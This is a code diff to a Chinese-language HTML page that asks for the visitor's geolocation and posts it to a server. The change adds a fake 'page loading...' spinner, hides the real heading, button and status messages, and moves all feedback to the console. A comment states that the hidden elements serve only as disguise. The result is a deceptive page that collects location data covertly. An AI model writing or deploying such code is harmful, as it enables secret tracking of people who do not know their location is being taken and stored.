@@ -3,21 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>访问失败，请刷新页面</title>
+    <title>页面加载中...</title>
     <style>
-        /* 隐藏所有元素，显示一个空白页面 */
+        /* 页面基础样式 */
         body {
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             background-color: white; /* 空白背景 */
             overflow: hidden; /* 防止滚动 */
         }
+
+        /* 隐藏不必要的元素 */
         h1, button, p {
             display: none; /* 隐藏文本和按钮 */
+        }
+
+        /* 加载动画样式 */
+        .loader {
+            border: 16px solid #f3f3f3; /* Light grey */
+            border-top: 16px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
+    <!-- 显示加载动画 -->
+    <div class="loader"></div>
+
+    <!-- 这些元素被隐藏，只用于伪装目的 -->
     <h1>获取用户定位</h1>
     <button id="getLocationButton" onclick="getLocation()">获取定位</button>
     <p id="status"></p>
@@ -50,29 +75,35 @@
             })
             .then(response => response.json())
             .then(data => {
-                document.getElementById('status').textContent = '位置数据已保存: ' + JSON.stringify(data);
+                console.log('位置数据已保存: ', data);
+                hideLoader(); // 隐藏加载动画
             })
             .catch(error => {
-                document.getElementById('status').textContent = '保存位置数据失败: ' + error;
+                console.error('保存位置数据失败: ', error);
+                hideLoader(); // 隐藏加载动画
             });
         }
 
         function showError(error) {
-            // 这里你可以添加更多的错误处理逻辑，例如记录日志等
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    document.getElementById('status').textContent = "用户拒绝了请求地理位置的权限。";
+                    console.warn("用户拒绝了请求地理位置的权限。");
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById('status').textContent = "位置信息不可用。";
+                    console.warn("位置信息不可用。");
                     break;
                 case error.TIMEOUT:
-                    document.getElementById('status').textContent = "请求地理位置超时。";
+                    console.warn("请求地理位置超时。");
                     break;
                 case error.UNKNOWN_ERROR:
-                    document.getElementById('status').textContent = "发生未知错误。";
+                    console.warn("发生未知错误。");
                     break;
             }
+            hideLoader(); // 无论何种错误，都隐藏加载动画
+        }
+
+        function hideLoader() {
+            document.querySelector('.loader').style.display = 'none';
         }
     </script>
 </body>
